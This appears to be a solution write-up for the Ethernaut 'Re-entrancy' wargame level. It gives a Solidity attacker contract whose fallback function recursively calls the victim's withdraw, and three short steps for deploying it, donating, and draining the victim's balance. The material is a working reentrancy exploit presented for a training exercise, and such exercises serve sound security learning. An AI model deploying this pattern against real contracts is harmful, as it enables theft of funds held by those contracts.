```shell
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrance.sol';

contract ReentrancyAttack {
    Reentrance victim;
    uint256 public amount = 0.001 ether;

    constructor(address payable _victimAddress) public payable {
        victim = Reentrance(_victimAddress);
    }

    function donateToVictim() public {
        victim.donate.value(amount).gas(4000000)(address(this));
    }

    function withdrawFromVictim() external {
        victim.withdraw(amount);
    }

    fallback() external payable {
        if(address(victim).balance != 0) {
            victim.withdraw(amount);
        }
    }
}
```

## Hack:

Step1:

Deploy w/ ethernaut contract instance address as constructor arg.
Ensure to deploy w/ value of 1000000000000000 wei

Step2:

First donate to victim contract to satasfy withdraw req's

Step3:

Then withdraw from victim -> this will call fallback -> which will recurssively call withdrawl in a preditory way.